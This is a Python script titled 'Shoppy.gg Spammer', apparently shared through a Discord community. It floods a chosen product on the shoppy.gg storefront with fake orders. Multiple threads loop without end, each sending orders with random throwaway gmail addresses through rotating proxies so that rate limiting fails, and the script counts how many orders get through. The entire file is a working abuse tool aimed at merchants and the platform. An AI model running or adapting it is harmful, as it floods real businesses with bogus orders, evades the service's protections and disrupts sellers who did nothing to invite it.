import requests, random, string, os, logging
from os import system, name
from json import JSONDecodeError
from pystyle import Colors, Colorate, Center
from concurrent.futures import ThreadPoolExecutor

# Create a logger
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

logo = """
███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
██╔════╝██║  ██║██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
███████╗███████║██║   ██║██████╔╝██████╔╝ ╚████╔╝     ███████╗██████╔╝███████║██╔████╔██║
╚════██║██╔══██║██║   ██║██╔═══╝ ██╔═══╝   ╚██╔╝      ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
███████║██║  ██║╚██████╔╝██║     ██║        ██║       ███████║██║     ██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝        ╚═╝       ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝"""

class Spammer:
    def __init__(self):
        self.proxies = []
        self.sent_count = 0
        self.ratelimited_count = 0
        self.logo = logo
        self.load_proxies()

    # Clear console function
    def clear(self):
        system("cls" if name in ("nt", "dos") else "clear")

    # Print logo
    def print_logo(self):
        self.clear()
        print(Center.XCenter(Colorate.Vertical(Colors.white_to_blue, self.logo, 1)))
        print(Center.XCenter(Colorate.Vertical(Colors.white_to_blue, "------------------------------------------------------------------------------------------\n\n", 1)))

    def load_proxies(self):
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                self.proxies = [line.strip() for line in f]
        else:
            logger.error("The proxies.txt file doesn't exist. Please add proxies to proxies.txt.")
            exit()

    def get_random_string(self, length):
        return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

    def call_api(self, proxy_dict, data):
        try:
            response = requests.put('https://shoppy.gg/api/v1/public/order/store', json=data, proxies=proxy_dict)
            response.raise_for_status()
            json_data = response.json()
            order_id = json_data["order"]["id"]
            logger.info(f"Sent({response.status_code}) - Order: {order_id}")
            self.sent_count += 1
        except JSONDecodeError:
            logger.warning("Ratelimited!")
            self.ratelimited_count += 1
        except Exception as e:
            logger.error(f"Error: {e}")

    def send_request(self, product):
        while True:
            data = {
                "email": f"{self.get_random_string(10)}@gmail.com",
                "fields": [],
                "gateway": "BTC",
                "product": product,
                "quantity": 1
            }
            proxy = random.choice(self.proxies)
            proxy_dict = {'http': f"http://{proxy}", 'https': f'http://{proxy}'}
            self.call_api(proxy_dict, data)
            os.system(f"title Shoppy.gg Spammer - Sent: {self.sent_count} - Ratelimited: {self.ratelimited_count} - Product: {product} - discord.gg/kws")

    def run(self):
        self.print_logo()
        product = input("Enter some valid product code from the shop you want to spam: ")
        threads = int(input("Enter the number of threads you want to use (recommended: 10): "))
        self.clear()
        with ThreadPoolExecutor(max_workers=int(threads)) as executor:
            for _ in range(int(threads)):
                executor.submit(lambda: self.send_request(product))

if __name__ == "__main__":
    os.system(f"title Shoppy.gg Spammer - discord.gg/kws")
    spammer = Spammer()
    spammer.run()